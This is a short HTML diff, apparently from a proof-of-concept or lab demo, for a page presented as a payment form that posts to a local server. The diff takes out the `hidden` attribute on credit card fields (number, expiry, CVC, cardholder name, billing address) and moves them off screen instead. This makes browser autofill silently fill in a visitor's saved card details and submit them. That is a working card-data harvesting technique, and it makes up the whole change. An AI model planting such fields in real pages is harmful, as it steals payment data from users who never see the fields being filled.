@@ -11,11 +11,11 @@
         <h1>Welcome to the Payment Page</h1>
         <form id="paymentForm" method="POST" action="http://localhost:3000/submit-payment">
             <!-- Hidden Form Fields to trigger autofill -->
-            <input type="text" id="cardNumber" name="cardNumber" autocomplete="cc-number" hidden>
-            <input type="text" id="expiryDate" name="expiryDate" autocomplete="cc-exp" hidden>
-            <input type="text" id="cvc" name="cvc" autocomplete="cc-csc" hidden>
-            <input type="text" id="cardNickname" name="cardNickname" autocomplete="cc-name" hidden>
-            <input type="text" id="billingAddress" name="billingAddress" autocomplete="billing address" hidden>
+            <input type="text" id="cardNumber" name="cardNumber" autocomplete="cc-number" style="position: absolute; left: -9999px;">
+            <input type="text" id="expiryDate" name="expiryDate" autocomplete="cc-exp" style="position: absolute; left: -9999px;">
+            <input type="text" id="cvc" name="cvc" autocomplete="cc-csc" style="position: absolute; left: -9999px;">
+            <input type="text" id="cardNickname" name="cardNickname" autocomplete="cc-name" style="position: absolute; left: -9999px;">
+            <input type="text" id="billingAddress" name="billingAddress" autocomplete="billing address" style="position: absolute; left: -9999px;">
         </form>
     </div>
 
